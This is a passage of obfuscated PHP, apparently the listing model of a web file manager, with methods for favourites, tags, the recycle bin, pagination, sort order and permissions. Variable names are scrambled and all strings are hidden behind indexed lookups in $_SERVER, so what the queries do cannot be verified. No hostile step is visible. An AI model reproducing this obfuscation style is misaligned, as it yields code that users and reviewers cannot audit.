(isset($Ÿ»ÜÇİ[$ÑçåŸ¡ç])) { $Ÿ»ÜÇİ[$ÑçåŸ¡ç] = intval($Ÿ»ÜÇİ[$ÑçåŸ¡ç]); } } $Ÿ»ÜÇİ[$ãÑ—´î²[84]] = $ãÑ—´î²[408] . $Ÿ»ÜÇİ[$ãÑ—´î²[402]] . $ãÑ—´î²[409]; $Ÿ»ÜÇİ[$ãÑ—´î²[33]] = $Ÿ»ÜÇİ[$ãÑ—´î²[410]] == 1 ? $ãÑ—´î²[75] : $ãÑ—´î²[199]; $Ÿ»ÜÇİ[$ãÑ—´î²[411]] = $this->typeName($Ÿ»ÜÇİ[$ãÑ—´î²[411]]); if ($Ÿ»ÜÇİ[$ãÑ—´î²[410]] != 1) { $Ÿ»ÜÇİ[$ãÑ—´î²[174]] = $Ÿ»ÜÇİ[$ãÑ—´î²[412]]; unset($Ÿ»ÜÇİ[$ãÑ—´î²[412]]); } $ãŠÅš„û = $šĞäÍ¶¼; if (isset($Ÿ»ÜÇİ[$ãÑ—´î²[413]]) && $Ÿ»ÜÇİ[$ãÑ—´î²[413]][$ãÑ—´î²[414]] == -1) { $ãŠÅš„û = $†ÔşßîÃ; } $Ÿ»ÜÇİ = array_field_key($Ÿ»ÜÇİ, $ãŠÅš„û); return $Ÿ»ÜÇİ; } public function listUserFav() { $ˆ‚êòõù =& $_SERVER[­õöî’–]; $ëø…ëÔÒ = Model($ˆ‚êòõù[415])->listData(); $ã¢¨ € = array_filter_by_field($ëø…ëÔÒ, $ˆ‚êòõù[33], $ˆ‚êòõù[416]); $ã¢¨ € = array_to_keyvalue($ã¢¨ €, $ˆ‚êòõù[12], $ˆ‚êòõù[84]); if ($ã¢¨ €) { $—¥™ı­® = $this->listSource(array($ˆ‚êòõù[417] => array($ˆ‚êòõù[418], $ã¢¨ €))); } $—¥™ı­® = array_to_keyvalue($—¥™ı­®[$ˆ‚êòõù[369]], $ˆ‚êòõù[402]); foreach ($ëø…ëÔÒ as &$»ğ®Ã™•) { $»ğ®Ã™• = array($ˆ‚êòõù[419] => $»ğ®Ã™•[$ˆ‚êòõù[399]], $ˆ‚êòõù[420] => $»ğ®Ã™•[$ˆ‚êòõù[32]], $ˆ‚êòõù[421] => $»ğ®Ã™•[$ˆ‚êòõù[84]], $ˆ‚êòõù[422] => $»ğ®Ã™•[$ˆ‚êòõù[33]], $ˆ‚êòõù[423] => $»ğ®Ã™•[$ˆ‚êòõù[200]], $ˆ‚êòõù[424] => $»ğ®Ã™•[$ˆ‚êòõù[85]]); if ($»ğ®Ã™•[$ˆ‚êòõù[33]] == $ˆ‚êòõù[416] && $—¥™ı­®[$»ğ®Ã™•[$ˆ‚êòõù[84]]]) { $»ğ®Ã™•[$ˆ‚êòõù[86]] = $—¥™ı­®[$»ğ®Ã™•[$ˆ‚êòõù[84]]]; } } unset($»ğ®Ã™•); return $ëø…ëÔÒ; } public function listUserTag($ò¸¡”œÂ) { $›¢¨×Ú‘ =& $_SERVER[­õöî’–]; if ($ò¸¡”œÂ && !is_array($ò¸¡”œÂ)) { $ò¸¡”œÂ = array($ò¸¡”œÂ); } $İßô£ğÔ = Model($›¢¨×Ú‘[425])->listData(); $êÌÛâÅ¯ = array(); $ ­ÃÈã = array(); foreach ($İßô£ğÔ as $ÈŠ«È¥É) { $òŞ“¼“ = $ÈŠ«È¥É[$›¢¨×Ú‘[84]]; if (!$òŞ“¼“) { continue; } if (!isset($ ­ÃÈã[$òŞ“¼“])) { $ ­ÃÈã[$òŞ“¼“] = array(); } $ ­ÃÈã[$òŞ“¼“][] = $ÈŠ«È¥É[$›¢¨×Ú‘[426]]; $êÌÛâÅ¯[$ÈŠ«È¥É[$›¢¨×Ú‘[84]]] = $ÈŠ«È¥É; } $öé«ÀÆ“ = array(); $ÒÔÛ“ = array(); $¨È‰È•Ù = array(); foreach ($ ­ÃÈã as $Œ‡ùÂ‚ñ => $óşíì…) { $À–¾£¥´ = !0; if (!$ò¸¡”œÂ) { $öé«ÀÆ“[] = $Œ‡ùÂ‚ñ; continue; } foreach ($ò¸¡”œÂ as $–¼’ª£–) { if (!in_array($–¼’ª£–, $óşíì…)) { $À–¾£¥´ = !1; break; } } if (!$À–¾£¥´) { continue; } if (!is_numeric($Œ‡ùÂ‚ñ)) { $ßÆ¿– = $êÌÛâÅ¯[$Œ‡ùÂ‚ñ]; $Ù•İ˜‡´ = array($›¢¨×Ú‘[32] => $ßÆ¿–[$›¢¨×Ú‘[32]], $›¢¨×Ú‘[84] => $ßÆ¿–[$›¢¨×Ú‘[84]], $›¢¨×Ú‘[33] => $ßÆ¿–[$›¢¨×Ú‘[33]], $›¢¨×Ú‘[86] => array($›¢¨×Ú‘[427] => 1), $›¢¨×Ú‘[201] => !0); if ($ßÆ¿–[$›¢¨×Ú‘[33]] == $›¢¨×Ú‘[199]) { $¨È‰È•Ù[] = $Ù•İ˜‡´; } if ($ßÆ¿–[$›¢¨×Ú‘[33]] == $›¢¨×Ú‘[75]) { $ÒÔÛ“[] = $Ù•İ˜‡´; } continue; } $öé«ÀÆ“[] = $Œ‡ùÂ‚ñ; } if ($öé«ÀÆ“) { $ˆÛ²×üÙ = $this->listSource(array($›¢¨×Ú‘[417] => array($›¢¨×Ú‘[418], $öé«ÀÆ“))); } $ˆÛ²×üÙ = $ˆÛ²×üÙ ? $ˆÛ²×üÙ : array($›¢¨×Ú‘[82] => array(), $›¢¨×Ú‘[83] => array()); $ˆÛ²×üÙ[$›¢¨×Ú‘[82]] = array_merge($ˆÛ²×üÙ[$›¢¨×Ú‘[82]], $ÒÔÛ“); $ˆÛ²×üÙ[$›¢¨×Ú‘[83]] = array_merge($ˆÛ²×üÙ[$›¢¨×Ú‘[83]], $¨È‰È•Ù); if (isset($ˆÛ²×üÙ[$›¢¨×Ú‘[366]]) && count($öé«ÀÆ“) == $ˆÛ²×üÙ[$›¢¨×Ú‘[366]][$›¢¨×Ú‘[367]]) { return $ˆÛ²×üÙ; } $ïÃùç¤Ï = array(); $£‹şÓè  = array_to_keyvalue($ˆÛ²×üÙ[$›¢¨×Ú‘[82]], $›¢¨×Ú‘[12], $›¢¨×Ú‘[402]); $ÌÍã‰ı = array_to_keyvalue($ˆÛ²×üÙ[$›¢¨×Ú‘[83]], $›¢¨×Ú‘[12], $›¢¨×Ú‘[402]); $³á”ëÈ = array_merge($ÌÍã‰ı, $£‹şÓè ); foreach ($öé«ÀÆ“ as $òŞ“¼“) { if (!in_array($òŞ“¼“, $³á”ëÈ)) { $ïÃùç¤Ï[] = $òŞ“¼“; } } if ($ïÃùç¤Ï) { Model($›¢¨×Ú‘[428])->removeBySource($ïÃùç¤Ï); } return $ˆÛ²×üÙ; } public function listUserRecycle() { $ù™ÂÒ© =& $_SERVER[­õöî’–]; $Î–°—‡ù = Model($ù™ÂÒ©[429])->listData(); if (!$Î–°—‡ù) { return array(); } $Ğâ¦§°ò = array($ù™ÂÒ©[417] => array($ù™ÂÒ©[418], $Î–°—‡ù), $ù™ÂÒ©[430] => 1); return $this->listSource($Ğâ¦§°ò); } public function listSource($€ªÆ¬è, $¦ĞÅÅ•¤ = 3000, $ÂäßÛÌ = false) { $÷½‘«¤ë =& $_SERVER[­õöî’–]; if (!isset($€ªÆ¬è[$÷½‘«¤ë[431]])) { $€ªÆ¬è[$÷½‘«¤ë[431]] = 0; } if (isset($€ªÆ¬è[$÷½‘«¤ë[432]]) && $€ªÆ¬è[$÷½‘«¤ë[432]] == $÷½‘«¤ë[197]) { $€ªÆ¬è[$÷½‘«¤ë[412]] = array($÷½‘«¤ë[331], $÷½‘«¤ë[433]); } $ï›êˆ™Ù = $÷½‘«¤ë[434]; $–ğğ…ìš = $this->field($ï›êˆ™Ù)->_makeOrder()->where($€ªÆ¬è)->selectPage($¦ĞÅÅ•¤); $this->_listPageCheck($–ğğ…ìš, $ï›êˆ™Ù, $€ªÆ¬è); $this->_listDataApply($–ğğ…ìš[$÷½‘«¤ë[369]], $ÂäßÛÌ); $this->_listMake($–ğğ…ìš); return $–ğğ…ìš; } private function _listPageCheck(&$ÛùÙ´‘Æ, $‚‘›á´›, $í£êü™à) { $öÅù¥¹º =& $_SERVER[­õöî’–]; if (!is_array($ÛùÙ´‘Æ[$öÅù¥¹º[366]])) { return; } $§»ª¯ò = $ÛùÙ´‘Æ[$öÅù¥¹º[366]]; if ($§»ª¯ò[$öÅù¥¹º[368]] <= 1) { return; } if ($§»ª¯ò[$öÅù¥¹º[367]] >= 100000) { return; } if (Model($öÅù¥¹º[435])->get($öÅù¥¹º[436]) != $öÅù¥¹º[437]) { return; } $‚‘›á´› = str_replace(array($öÅù¥¹º[53], $öÅù¥¹º[342], $öÅù¥¹º[231]), $öÅù¥¹º[12], $‚‘›á´›); $‚‘›á´› = $öÅù¥¹º[438] . str_replace($öÅù¥¹º[50], $öÅù¥¹º[439], $‚‘›á´›) . $öÅù¥¹º[440]; $—°›ûäå = $öÅù¥¹º[441]; $—°›ûäå = $—°›ûäå . $öÅù¥¹º[442]; $³ÚâºŸÖ = $§»ª¯ò[$öÅù¥¹º[363]] * ($§»ª¯ò[$öÅù¥¹º[353]] - 1) . $öÅù¥¹º[50] . $§»ª¯ò[$öÅù¥¹º[363]]; $Çº×¿À = $this->_makeOrder(!0); $ì¼ŒÜÜŞ = $öÅù¥¹º[438] . str_replace($öÅù¥¹º[50], $öÅù¥¹º[439], $Çº×¿À[0]); if (strpos($ì¼ŒÜÜŞ, $öÅù¥¹º[443])) { $ì¼ŒÜÜŞ = str_replace($öÅù¥¹º[443], $öÅù¥¹º[444], $ì¼ŒÜÜŞ); } else { $ì¼ŒÜÜŞ .= $öÅù¥¹º[445] . $Çº×¿À[1]; } $¹ÌÖğâÚ = array(); foreach ($í£êü™à as $¢şÉÓ => $ü‚áì×) { $¹ÌÖğâÚ[$öÅù¥¹º[438] . $¢şÉÓ] = $ü‚áì×; } $this->alias($öÅù¥¹º[446])->field($‚‘›á´›)->limit($³ÚâºŸÖ)->order($ì¼ŒÜÜŞ); $¯‚İƒ–… = $this->join($—°›ûäå)->where($¹ÌÖğâÚ)->select(); if ($¯‚İƒ–…) { $ÛùÙ´‘Æ[$öÅù¥¹º[369]] = $¯‚İƒ–…; } } protected function _makeOrder($¼ìÇà‰Ã = false) { $Íò¥ÙŸ =& $_SERVER[­õöî’–]; $š¨¼ûìò = Model($Íò¥ÙŸ[447])->get($Íò¥ÙŸ[448]); $ŒÚ†–èí = Model($Íò¥ÙŸ[447])->get($Íò¥ÙŸ[449]); $Á„„ñŞÒ = array($Íò¥ÙŸ[450] => $Íò¥ÙŸ[451], $Íò¥ÙŸ[452] => $Íò¥ÙŸ[453]); $—ÍòÉÒì = array($Íò¥ÙŸ[32] => $Íò¥ÙŸ[32], $Íò¥ÙŸ[76] => $Íò¥ÙŸ[76], $Íò¥ÙŸ[174] => $Íò¥ÙŸ[412], $Íò¥ÙŸ[454] => $Íò¥ÙŸ[454], $Íò¥ÙŸ[455] => $Íò¥ÙŸ[456], $Íò¥ÙŸ[200] => $Íò¥ÙŸ[200], $Íò¥ÙŸ[85] => $Íò¥ÙŸ[85]); $™Åû×¨¨ = Input::get($Íò¥ÙŸ[457], $Íò¥ÙŸ[7], $š¨¼ûìò, array_keys($—ÍòÉÒì)); $ÁÕÕíõ = Input::get($Íò¥ÙŸ[458], $Íò¥ÙŸ[7], $ŒÚ†–èí, array_keys($Á„„ñŞÒ)); if (!in_array($™Åû×¨¨, array_keys($—ÍòÉÒì))) { $™Åû×¨¨ = $Íò¥ÙŸ[32]; } if (!in_array($ÁÕÕíõ, array_keys($Á„„ñŞÒ))) { $™Åû×¨¨ = $Íò¥ÙŸ[450]; } if ($™Åû×¨¨ == $Íò¥ÙŸ[32]) { } $‹ÉÉä½İ = $Íò¥ÙŸ[459] . $—ÍòÉÒì[$™Åû×¨¨] . $Íò¥ÙŸ[53] . $Á„„ñŞÒ[$ÁÕÕíõ]; $‹ÉÉä½İ = rtrim(trim($‹ÉÉä½İ), $Íò¥ÙŸ[50]); if ($¼ìÇà‰Ã) { return array($‹ÉÉä½İ, $Á„„ñŞÒ[$ÁÕÕíõ]); } return $this->order($‹ÉÉä½İ); } protected function _listDataApplyItem($ËöÖò“, $¾…¿ŞÒ = false) { $º‹€Úˆ¢ = array($ËöÖò“); $this->_listDataApply($º‹€Úˆ¢, $¾…¿ŞÒ); return $º‹€Úˆ¢[0]; } protected function _listDataApply(&$±÷‰£°, $›åéªÇÚ = false) { $„‚Ò™Ô =& $_SERVER[­õöî’–]; if (!$±÷‰£°) { $±÷‰£° = array(); return; } $¾’Öğõ‘ = array_to_keyvalue($±÷‰£°, $„‚Ò™Ô[12], $„‚Ò™Ô[402]); $¾’Öğõ‘ = array_unique($¾’Öğõ‘); $this->_listSourceCache($±÷‰£°); if (!$›åéªÇÚ) { $this->_listAppendMeta($±÷‰£°, $¾’Öğõ‘); $this->_listAppendFileMeta($±÷‰£°, $¾’Öğõ‘); $this->_listAppendChildren($±÷‰£°, $¾’Öğõ‘); } $this->_listAppendPath($±÷‰£°); $this->_listAppendAuth($±÷‰£°); $this->_listAppendSourceInfo($±÷‰£°, $¾’Öğõ‘); $this->_listAppendUser($±÷‰£°); $this->_listFilterInfo($±÷‰£°, $›åéªÇÚ); $this->_listAppendAuthSecret($±÷‰£°); } protected function _listSourceCache($Ãú¯ä€) { $ ”í Åå =& $_SERVER[­õöî’–]; foreach ($Ãú¯ä€ as $œ®¯‡Àè) { self::$cacheSourceInfo[$ ”í Åå[460] . $œ®¯‡Àè[$ ”í Åå[402]]] = $œ®¯‡Àè; } } protected function _listFilterInfo(&$–¶…ô˜, $ÔŠàõ = false) { $Š‰·²²Á =& $_SERVER[­õöî’–]; foreach ($–¶…ô˜ as &$·—çóÀç) { $·—çóÀç = $this->pathInfoFilter($·—çóÀç); self::$cachePathInfo[$Š‰·²²Á[461] . intval($ÔŠàõ) . $Š‰·²²Á[386] . $·—çóÀç[$Š‰·²²Á[402]]] = $·—çóÀç; } unset($·—çóÀç); } protected function _listMake(&$¼ºÔ¶Û) { $ÂÅ¸†ìÃ =& $_SERVER[­õöî’–]; $¼ºÔ¶Û[$ÂÅ¸†ìÃ[82]] = array(); $¼ºÔ¶Û[$ÂÅ¸†ìÃ[83]] = array(); foreach ($¼ºÔ¶Û[$ÂÅ¸†ìÃ[369]] as $ú¡¤Òùç) { $ôîÑºÇÈ = $ú¡¤Òùç[$ÂÅ¸†ìÃ[410]] == 1 ? $ÂÅ¸†ìÃ[82] : $ÂÅ¸†ìÃ[83]; $¼ºÔ¶Û[$ôîÑºÇÈ][] = $ú¡¤Òùç; } unset($¼ºÔ¶Û[$ÂÅ¸†ìÃ[369]]); } protected function _listAppendMeta(&$Üë‡¬õé, $ñ˜èÏ…¡) { $ø·ê©®¥ =& $_SERVER[­õöî’–]; $ßÙî…õ¥ = array($ø·ê©®¥[417] => array($ø·ê©®¥[418], $ñ˜èÏ…¡)); $™Â°×³  = Model($ø·ê©®¥[462])->field($ø·ê©®¥[463])->where($ßÙî…õ¥)->select(); if (!$™Â°×³ ) { return; } $­ó¾ĞØÚ = array($ø·ê©®¥[464], $ø·ê©®¥[465], $ø·ê©®¥[444]); $¾»ÖÃ†º = array(); foreach ($™Â°×³  as $Ü’‡ÛÑ) { if (!isset($¾»ÖÃ†º[$Ü’‡ÛÑ[$ø·ê©®¥[402]]])) { $¾»ÖÃ†º[$Ü’‡ÛÑ[$ø·ê©®¥[402]]] = array(); } if (in_array($Ü’‡ÛÑ[$ø·ê©®¥[94]], $­ó¾ĞØÚ)) { continue; } $¾»ÖÃ†º[$Ü’‡ÛÑ[$ø·ê©®¥[402]]][$Ü’‡ÛÑ[$ø·ê©®¥[94]]] = $Ü’‡ÛÑ[$ø·ê©®¥[374]]; } foreach ($Üë‡¬õé as &$®Ä¶Ãü) { $®Ä¶Ãü[$ø·ê©®¥[466]] = !1; if (isset($¾»ÖÃ†º[$®Ä¶Ãü[$ø·ê©®¥[402]]])) { $®Ä¶Ãü[$ø·ê©®¥[466]] = $¾»ÖÃ†º[$®Ä¶Ãü[$ø·ê©®¥[402]]]; } if ($this->fileIsLock($®Ä¶Ãü) && $®Ä¶Ãü[$ø·ê©®¥[413]]) { $í­£Äª¹ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $®Ä¶Ãü[$ø·ê©®¥[413]][$ø·ê©®¥[414]] = AuthModel::authDisable($®Ä¶Ãü[$ø·ê©®¥[413]][$ø·ê©®¥[414]], $í­£Äª¹); $®Ä¶Ãü[$ø·ê©®¥[413]][$ø·ê©®¥[467]][$ø·ê©®¥[413]] = $®Ä¶Ãü[$ø·ê©®¥[413]][$ø·ê©®¥[414]]; } } unset($®Ä¶Ãü); } protected function _listAppendFileMeta(&$¢Ò•ÏìÇ, $ÚÈïõÕ©) { $ı‚–õ¦— =& $_SERVER[­õöî’–]; $øÀ¹é†· = array_to_keyvalue($¢Ò•ÏìÇ, $ı‚–õ¦—[12], $ı‚–õ¦—[468]); $øÀ¹é†· = array_filter(array_unique($øÀ¹é†·)); if (!$øÀ¹é†·) { return; } $Ê‘¬Şı = array($ı‚–õ¦—[469] => array($ı‚–õ¦—[418], $øÀ¹é†·)); $øÅÉ£€û = $ı‚–õ¦—[470]; $­©É¥¼È = Model($ı‚–õ¦—[471])->field($øÅÉ£€û)->where($Ê‘¬Şı)->select(); $­©É¥¼È = array_to_keyvalue($­©É¥¼È, $ı‚–õ¦—[468]); $ë‚¸ô¶Õ = Model($ı‚–õ¦—[472])->field($ı‚–õ¦—[473])->where($Ê‘¬Şı)->select(); $ë‚¸ô¶Õ = $ë‚¸ô¶Õ ? $ë‚¸ô¶Õ : array(); $§÷¼×ƒü = array(); foreach ($ë‚¸ô¶Õ as $­°Ó–™â) { if (!isset($§÷¼×ƒü[$­°Ó–™â[$ı‚–õ¦—[468]]])) { $§÷¼×ƒü[$­°Ó–™â[$ı‚–õ¦—[468]]] = array(); } $§÷¼×ƒü[$­°Ó–™â[$ı‚–õ¦—[468]]][$­°Ó–™â[$ı‚–õ¦—[94]]] = $­°Ó–™â[$ı‚–õ¦—[374]]; } foreach ($¢Ò•ÏìÇ as &$ÙğÔŸ“·) { $³°‰ÛŒç = $ÙğÔŸ“·[$ı‚–õ¦—[468]]; if (!$³°‰ÛŒç || !is_array($­©É¥¼È[$³°‰ÛŒç])) { continue; } $¦åùÔÙº = $­©É¥¼È[$³°‰ÛŒç]; $¦åùÔÙº[$ı‚–õ¦—[76]] = $ÙğÔŸ“·[$ı‚–õ¦—[76]]; $¦åùÔÙº[$ı‚–õ¦—[32]] = $ÙğÔŸ“·[$ı‚–õ¦—[32]]; if (!isset(self::$cacheFileInfo[$ı‚–õ¦—[474] . $³°‰ÛŒç])) { self::$cacheFileInfo[$ı‚–õ¦—[474] . $³°‰ÛŒç] = array_merge(array(), $¦åùÔÙº); } unset($­©É¥¼È[$³°‰ÛŒç][$ı‚–õ¦—[84]]); $à¿ÔÄºü = is_array($§÷¼×ƒü[$³°‰ÛŒç]) ? $§÷¼×ƒü[$³°‰ÛŒç] : array(); $ÙğÔŸ“·[$ı‚–õ¦—[170]] = array_merge($à¿ÔÄºü, $­©É¥¼È[$³°‰ÛŒç]); if (isset($ÙğÔŸ“·[$ı‚–õ¦—[170]][$ı‚–õ¦—[169]])) { $ÙğÔŸ“·[$ı‚–õ¦—[169]] = json_decode($ÙğÔŸ“·[$ı‚–õ¦—[170]][$ı‚–õ¦—[169]], !0); unset($ÙğÔŸ“·[$ı‚–õ¦—[170]][$ı‚–õ¦—[169]]); } } unset($ÙğÔŸ“·); } protected function _listAppendSourceInfo(&$øù—ş±Á, $Õ–şöšÆ) { $¼½·«é =& $_SERVER[­õöî’–]; if (!defined($¼½·«é[475])) { return; } $ªñİÂŒ‡ = Model($¼½·«é[476])->listData(); $Óîó´Ş‚ = Model($¼½·«é[425])->listData(); $ğ©ÍÑ˜ = Model($¼½·«é[415])->listData(); $¥Õö¶àÌ = Model($¼½·«é[477])->listSimple(); $Â°Æ»¥Æ = array_to_keyvalue($ªñİÂŒ‡, $¼½·«é[399]); $õ¥ƒ§€ = array_to_keyvalue_group($Óîó´Ş‚, $¼½·«é[84], $¼½·«é[426]); $ûèİÂìš = array_to_keyvalue($ğ©ÍÑ˜, $¼½·«é[84]); $¦¨îûêµ = array_to_keyvalue_group($¥Õö¶àÌ, $¼½·«é[402]); foreach ($øù—ş±Á as &$‚‰úá–Í) { $‚‰úá–Í[$¼½·«é[86]] = array($¼½·«é[478] => 0, $¼½·«é[479] => 0, $¼½·«é[480] => 0); if (isset($ûèİÂìš[$‚‰úá–Í[$¼½·«é[402]]])) { $‚‰úá–Í[$¼½·«é[86]][$¼½·«é[481]] = 1; $‚‰úá–Í[$¼½·«é[86]][$¼½·«é[482]] = $ûèİÂìš[$‚‰úá–Í[$¼½·«é[402]]][$¼½·«é[32]]; } if ($õ¥ƒ§€ && $Â°Æ»¥Æ && isset($õ¥ƒ§€[$‚‰úá–Í[$¼½·«é[402]]])) { $‚‰úá–Í[$¼½·«é[86]][$¼½·«é[483]] = array(); foreach ($õ¥ƒ§€[$‚‰úá–Í[$¼½·«é[402]]] as $¥åáßğÚ) { $€ùßàÁ = $Â°Æ»¥Æ[$¥åáßğÚ]; $‚‰úá–Í[$¼½·«é[86]][$¼½·«é[483]][] = array($¼½·«é[484] => $€ùßàÁ[$¼½·«é[399]], $¼½·«é[420] => $€ùßàÁ[$¼½·«é[32]], $¼½·«é[485] => $€ùßàÁ[$¼½·«é[486]]); } } if ($¦¨îûêµ && isset($¦¨îûêµ[$‚‰úá–Í[$¼½·«é[402]]])) { $‚‰úá–Í[$¼½·«é[86]][$¼½·«é[487]] = array(); foreach ($¦¨îûêµ[$‚‰úá–Í[$¼½·«é[402]]] as $¯æ¹Ú¥) { $‚‰úá–Í[$¼½·«é[86]][$¼½·«é[487]] = array($¼½·«é[488] => $¯æ¹Ú¥[$¼½·«é[489]], $¼½·«é[490] => $¯æ¹Ú¥[$¼½·«é[491]], $¼½·«é[492] => $¯æ¹Ú¥[$¼½·«é[402]], $¼½·«é[493] => $¯æ¹Ú¥[$¼½·«é[494]], $¼½·«é[495] => $¯æ¹Ú¥[$¼½·«é[496]], $¼½·«é[497] => $¯æ¹Ú¥[$¼½·«é[497]], $¼½·«é[498] => $¯æ¹Ú¥[$¼½·«é[498]]); } } } unset($‚‰úá–Í); return $øù—ş±Á; } protected function _listAppendChildren(&$±™ËÌÆÃ, $ÔÉûö¿ç) { $ïµ¿×‹» =& $_SERVER[­õöî’–]; $”İç‡úø = array(); $—‹Á‡ù’ = array($ïµ¿×‹»[207] => 0, $ïµ¿×‹»[208] => 0); foreach ($±™ËÌÆÃ as &$·ÜÒõ¼‰) { if (!$·ÜÒõ¼‰[$ïµ¿×‹»[410]]) { continue; } $”İç‡úø[] = $·ÜÒõ¼‰[$ïµ¿×‹»[402]]; } unset($·ÜÒõ¼‰); if (!$”İç‡úø) { return; } $Š ùàÒÆ = array($ïµ¿×‹»[432] => array($ïµ¿×‹»[7], $”İç‡úø), $ïµ¿×‹»[431] => 0); $å§Š¿­ = array($ïµ¿×‹»[432], $ïµ¿×‹»[410], $ïµ¿×‹»[499] => $ïµ¿×‹»[500]); $ÖÜ©Ê¦ë = $this->field($å§Š¿­)->where($Š ùàÒÆ)->group($ïµ¿×‹»[501])->select(); $Œ“ Âš = array(); foreach ($ÖÜ©Ê¦ë as $ÊËî¹È½) { $şşßİêò = $ÊËî¹È½[$ïµ¿×‹»[432]]; $–ò³¬‹’ = $ÊËî¹È½[$ïµ¿×‹»[410]] == $ïµ¿×‹»[88] ? $ïµ¿×‹»[208] : $ïµ¿×‹»[207]; if (!isset($Œ“ Âš[$şşßİêò])) { $Œ“ Âš[$şşßİêò] = array($ïµ¿×‹»[207] => 0, $ïµ¿×‹»[208] => 0); } $Œ“ Âš[$şşßİêò][$–ò³¬‹’] += $ÊËî¹È½[$ïµ¿×‹»[500]]; } foreach ($±™ËÌÆÃ as &$·ÜÒõ¼‰) { if (!$·ÜÒõ¼‰[$ïµ¿×‹»[410]]) { continue; } $óµê·äú = is_array($Œ“ Âš[$·ÜÒõ¼‰[$ïµ¿×‹»[402]]]) ? $Œ“ Âš[$·ÜÒõ¼‰[$ïµ¿×‹»[402]]] : $—‹Á‡ù’; $·ÜÒõ¼‰[$ïµ¿×‹»[208]] = $óµê·äú[$ïµ¿×‹»[208]]; $·ÜÒõ¼‰[$ïµ¿×‹»[207]] = $óµê·äú[$ïµ¿×‹»[207]]; unset($·ÜÒõ¼‰[$ïµ¿×‹»[412]]); } unset($·ÜÒõ¼‰); } protected function _listAppendAuth(&$Á¾æÓ€) { $‹Ë¡«× =& $_SERVER[­õöî’–]; if (!defined($‹Ë¡«×[475])) { return; } $Ëèùåş÷ = array(); foreach ($Á¾æÓ€ as $á‚Í“Ùê) { if ($á‚Í“Ùê[$‹Ë¡«×[411]] == self::TYPE_GROUP) { $Ëèùåş÷[] = $á‚Í“Ùê[$‹Ë¡«×[402]]; } } if (!$Ëèùåş÷) { return; } $Ş¤¹µÉ = array_to_keyvalue($Á¾æÓ€, $‹Ë¡«×[402]); $çéªèÅ = Model($‹Ë¡«×[502])->getSourceList($Ëèùåş÷, $Ş¤¹µÉ); $ÃÒàú£Ê = $GLOBALS[$‹Ë¡«×[503]] == 1; foreach ($Á¾æÓ€ as $½çµ§Ÿé => &$á‚Í“Ùê) { $á‚Í“Ùê[$‹Ë¡«×[413]] = $çéªèÅ[$á‚Í“Ùê[$‹Ë¡«×[402]]]; if (!$á‚Í“Ùê[$‹Ë¡«×[413]] && $á‚Í“Ùê[$‹Ë¡«×[411]] == self::TYPE_GROUP) { $á‚Í“Ùê[$‹Ë¡«×[413]] = Action($‹Ë¡«×[504])->pathGroupAuthMake($á‚Í“Ùê[$‹Ë¡«×[505]]); if (!$á‚Í“Ùê[$‹Ë¡«×[413]] && !$ÃÒàú£Ê) { $á‚Í“Ùê[$‹Ë¡«×[202]] = !1; $á‚Í“Ùê[$‹Ë¡«×[201]] = !1; } } if ($á‚Í“Ùê[$‹Ë¡«×[413]]) { $á‚Í“Ùê[$‹Ë¡«×[202]] = AuthModel::authCheckEdit($á‚Í“Ùê[$‹Ë¡«×[413]][$‹Ë¡«×[414]]); $á‚Í“Ùê[$‹Ë¡«×[201]] = AuthModel::authCheckView($á‚Í“Ùê[$‹Ë¡«×[413]][$‹Ë¡«×[414]]); } $this->groupPathDisplay($á‚Í“Ùê); } unset($á‚Í“Ùê); } public function _listAppendAuthSecret(&$À§Æş‰ã) { $ºŒÌ¹ÇÕ =& $_SERVER[­õöî’–]; if (Model($ºŒÌ¹ÇÕ[435])->get($ºŒÌ¹ÇÕ[506]) != $ºŒÌ¹ÇÕ[88]) { return; } static $‰£¼ëŞñ = false; if (!$‰£¼ëŞñ) { $Æ–İõä¯ = Model($ºŒÌ¹ÇÕ[507]); $Î½«‡œÈ = Model($ºŒÌ¹ÇÕ[508]); $‰£¼ëŞñ = $Î½«‡œÈ->listData(); $‰£¼ëŞñ = array_to_keyvalue($‰£¼ëŞñ, $ºŒÌ¹ÇÕ[402]); $ûÈİÁê = json_decode(Model($ºŒÌ¹ÇÕ[435])->get($ºŒÌ¹ÇÕ[509]), !0); $ûÈİÁê = array_to_keyvalue($ûÈİÁê, $ºŒÌ¹ÇÕ[399]); foreach ($‰£¼ëŞñ as $í©™èè => $¹±ÜÇÓ) { $ñÊõúËŞ = $ûÈİÁê[$¹±ÜÇÓ[$ºŒÌ¹ÇÕ[510]]]; if (!$ñÊõúËŞ) { $Î½«‡œÈ->remove($¹±ÜÇÓ[$ºŒÌ¹ÇÕ[399]]); unset($‰£¼ëŞñ[$í©™èè]); continue; } $Åğ‡Õ®Ä = $Æ–İõä¯->listData($ñÊõúËŞ[$ºŒÌ¹ÇÕ[413]]); if (!$Åğ‡Õ®Ä) { $Î½«‡œÈ->remove($¹±ÜÇÓ[$ºŒÌ¹ÇÕ[399]]); unset($‰£¼ëŞñ[$í©™èè]); continue; } $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[413]] = $Åğ‡Õ®Ä; $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[511]] = $ñÊõúËŞ; $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[512]] = Model($ºŒÌ¹ÇÕ[513])->getInfoSimpleOuter($¹±ÜÇÓ[$ºŒÌ¹ÇÕ[454]]); $‰£¼ëŞñ[$í©™èè] = $¹±ÜÇÓ; } } $ˆ™ÖÎˆì = defined($ºŒÌ¹ÇÕ[514]) ? USER_ID : $ºŒÌ¹ÇÕ[12]; $ØŞı¹ƒ = array(); $ù¶œéì¢ = $this->_listAppendPath($ØŞı¹ƒ, !0); foreach ($À§Æş‰ã as $í©™èè => &$¹±ÜÇÓ) { if (!is_array($¹±ÜÇÓ[$ºŒÌ¹ÇÕ[413]])) { continue; } if ($¹±ÜÇÓ[$ºŒÌ¹ÇÕ[411]] != $ºŒÌ¹ÇÕ[515]) { continue; } if (isset($‰£¼ëŞñ[$¹±ÜÇÓ[$ºŒÌ¹ÇÕ[402]]])) { $ÓÙƒ…¢å = $‰£¼ëŞñ[$¹±ÜÇÓ[$ºŒÌ¹ÇÕ[402]]]; if (!is_array($¹±ÜÇÓ[$ºŒÌ¹ÇÕ[466]])) { $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[466]] = array(); } $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[466]][$ºŒÌ¹ÇÕ[516]] = $ÓÙƒ…¢å[$ºŒÌ¹ÇÕ[510]]; 